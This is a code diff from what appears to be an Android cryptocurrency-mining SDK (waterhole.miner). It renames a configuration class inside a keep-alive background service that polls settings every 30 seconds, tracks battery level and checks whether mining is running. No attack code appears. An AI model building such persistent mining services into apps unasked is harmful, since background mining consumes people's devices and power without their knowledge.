@@ -12,7 +12,7 @@ import io.reactivex.functions.Action;
 import io.reactivex.functions.Consumer;
 import waterhole.miner.core.StateObserver;
 import waterhole.miner.core.asyn.AsyncTaskListener;
-import waterhole.miner.core.config.NightConfigObject;
+import waterhole.miner.core.config.NightConfig;
 import waterhole.miner.core.config.NightConfiguration;
 import waterhole.miner.core.keepAlive.AbsWorkService;
 
@@ -25,7 +25,7 @@ public class TraceServiceImpl extends AbsWorkService {
     public static boolean sShouldStopService;
     public static Disposable sDisposable;
 
-    private NightConfigObject nightConfig;
+    private NightConfig nightConfig;
 
     private int startBatteryLevel;
 
@@ -120,9 +120,9 @@ public class TraceServiceImpl extends AbsWorkService {
                     public void accept(Long count) {
                         info("keep alive: 每 30 秒采集一次数据... count = " + count);
                         NightConfiguration.instance().getConfigObject(getApplicationContext(),
-                                new AsyncTaskListener<NightConfigObject>() {
+                                new AsyncTaskListener<NightConfig>() {
                                     @Override
-                                    public void runComplete(NightConfigObject nightConfig) {
+                                    public void runComplete(NightConfig nightConfig) {
                                         if (nightConfig == null || isMining()) {
                                             TraceServiceImpl.this.nightConfig = null;
                                             return;
